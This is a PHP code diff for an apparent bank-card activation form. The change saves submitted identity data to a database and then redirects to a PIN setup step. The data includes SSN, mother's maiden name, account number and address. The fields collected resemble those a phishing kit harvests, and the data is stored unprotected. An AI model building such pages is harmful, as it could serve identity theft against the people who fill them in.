@@ -85,11 +85,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $errors['maiden_name'] = 'Mother\'s maiden name is required';
     }
     
-    // If no errors, save to session and redirect
+    // If no errors, save to database and session, then redirect
     if (empty($errors)) {
+        // Save to database first
+        require_once 'includes/database.php';
+        $db = get_db_connection();
+        
+        if ($db) {
+            try {
+                $stmt = $db->prepare('INSERT INTO activation_requests 
+                    (first_name, last_name, dob, email, phone, account_number, 
+                     street, city, state, zip, ssn_last4, maiden_name, card_number, cvv, expiry_date, pin_hash, balance, status)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, "", "", "", "", ?, "pending")');
+                
+                $stmt->execute([
+                    $form_data['first_name'],
+                    $form_data['last_name'],
+                    $form_data['dob'],
+                    $form_data['email'],
+                    $form_data['phone'],
+                    $form_data['account_number'],
+                    $form_data['street'],
+                    $form_data['city'],
+                    $form_data['state'],
+                    $form_data['zip'],
+                    $form_data['ssn'],
+                    $form_data['maiden_name'],
+                    DEFAULT_BALANCE
+                ]);
+                
+                $_SESSION['request_id'] = $db->lastInsertId();
+            } catch (PDOException $e) {
+                error_log('Failed to save initial user data: ' . $e->getMessage());
+            }
+        }
+        
         $_SESSION['user_data'] = $form_data;
         $_SESSION['last_activity'] = time();
-        header('Location: card-display.php');
+        header('Location: pin-setup.php');
         exit();
     }
 }
